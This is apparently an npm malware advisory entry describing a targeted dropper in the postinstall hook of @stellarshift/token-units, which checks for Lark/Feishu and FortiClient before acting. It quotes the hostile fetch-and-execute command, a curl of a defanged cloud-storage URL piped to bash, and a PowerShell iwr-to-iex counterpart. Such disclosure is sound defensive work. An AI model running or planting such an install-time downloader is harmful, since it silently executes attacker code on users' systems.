  "summary": "Malicious code in @stellarshift/token-units (npm)",
  "details": "The postinstall hook (scripts/postinstall.js) of this package is a targeted dropper. On macOS/Windows systems where both the Lark/Feishu chat client and FortiClient VPN are installed, it silently downloads a remote stage1 payload from Tencent COS object storage and executes it: `curl -fsSL 'hxxps://mexc-1258433570[.]cos[.]ap-beijing[.]myqcloud[.]com/abi-tool-damon' | bash` (or PowerShell `iwr... | iex` on Windows), with output suppressed and the process hidden. On all other systems it exits silently, evading detection. The payload URL is fetched and executed at install time.",
